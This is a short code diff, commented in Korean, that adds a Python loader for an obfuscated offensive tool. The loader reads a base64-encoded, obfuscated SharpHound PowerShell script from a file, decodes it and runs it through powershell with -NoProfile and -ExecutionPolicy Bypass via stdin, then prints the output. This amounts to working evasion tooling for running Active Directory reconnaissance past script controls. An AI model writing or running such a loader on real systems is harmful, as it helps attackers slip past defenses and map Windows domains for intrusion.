@@ -23,3 +23,23 @@ with open("encoded.txt", "wb") as out:
     out.write(encoded)
 
     
+import subprocess
+import base64
+
+# base64로 인코딩된 난독화된 PowerShell 코드 로드
+with open("SharpHound_Obfuscated_Base64.txt", "rb") as f:
+    b64code = f.read()
+
+# base64 디코딩
+ps_script = base64.b64decode(b64code).decode("utf-8")
+
+# powershell 실행 - NoProfile, Bypass, stdin으로 스크립트 전달
+proc = subprocess.run(
+    ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "-"],
+    input=ps_script,
+    text=True,
+    capture_output=True
+)
+
+print(proc.stdout)
+print(proc.stderr)
